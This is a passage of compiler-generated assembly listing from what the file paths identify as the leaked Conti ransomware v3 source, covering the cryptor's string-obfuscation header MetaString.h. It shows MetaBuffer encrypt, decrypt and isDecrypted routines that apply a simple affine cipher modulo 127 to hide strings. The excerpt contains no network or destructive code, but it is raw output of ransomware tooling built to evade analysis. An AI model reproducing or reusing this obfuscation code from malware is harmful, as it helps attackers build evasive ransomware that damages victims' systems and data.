  0000f	45 03 c0	 add	 r8d, r8d

; 40   :     return (a % n + n) % n;

  00012	41 f7 e8	 imul	 r8d
  00015	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001a	41 03 d0	 add	 edx, r8d
  0001d	c1 fa 06	 sar	 edx, 6
  00020	8b ca		 mov	 ecx, edx
  00022	c1 e9 1f	 shr	 ecx, 31
  00025	03 d1		 add	 edx, ecx
  00027	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002a	44 2b c1	 sub	 r8d, ecx
  0002d	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00031	41 f7 e8	 imul	 r8d
  00034	41 03 d0	 add	 edx, r8d
  00037	c1 fa 06	 sar	 edx, 6
  0003a	8b ca		 mov	 ecx, edx
  0003c	c1 e9 1f	 shr	 ecx, 31
  0003f	03 d1		 add	 edx, ecx
  00041	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00044	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00047	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004b	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FJ@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ENDP ; MetaBuffer<89,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0FJ@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0FJ@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z PROC ; MetaBuffer<89,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 59	 imul	 r8d, eax, 89		; 00000059H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 50	 add	 r8d, 80			; 00000050H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0FJ@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ENDP ; MetaBuffer<89,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0FJ@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0FJ@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ PROC ; MetaBuffer<89,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0FJ@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ENDP ; MetaBuffer<89,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z PROC ; MetaBuffer<103,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 0f	 sub	 eax, 15
  00006	44 6b c0 25	 imul	 r8d, eax, 37		; 00000025H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ENDP ; MetaBuffer<103,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z PROC ; MetaBuffer<103,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 67	 imul	 r8d, eax, 103		; 00000067H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 0f	 add	 r8d, 15
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ENDP ; MetaBuffer<103,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ PROC ; MetaBuffer<103,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ENDP ; MetaBuffer<103,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
_TEXT	ENDS
END
